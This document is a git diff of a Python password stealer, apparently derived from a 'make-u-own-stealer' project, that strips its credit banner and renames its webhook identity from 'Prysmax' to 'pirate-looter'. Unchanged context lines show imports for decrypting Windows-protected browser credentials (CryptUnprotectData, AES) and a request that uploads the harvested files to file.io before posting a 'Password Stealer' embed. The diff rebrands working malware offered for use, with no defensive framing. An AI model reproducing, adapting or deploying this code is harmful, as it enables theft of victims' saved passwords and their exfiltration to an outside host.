@@ -1,12 +1,3 @@
-# #  # # # # # # # # # # # # # # # # # # #
-#        GITHUB.COM/Lawxsz               #
-#                                        #
-#    Credits or at least one star :)     #
-#   SCRIPT BY henry-richard7             #
-#   improved and adapted by Lawxsz       #
-# #  # # # # # # # # # # # # # # # # # # #
-
-
 import os, requests, json, base64, sqlite3, shutil
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
@@ -235,7 +226,7 @@ def mainpass():
     response = requests.post("https://file.io", files=files, params=params).json()
     todo = {
     "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
-    "username": "Prysmax",
+    "username": "pirate-looter",
     "embeds": [
         {
             "title": "Password Stealer",
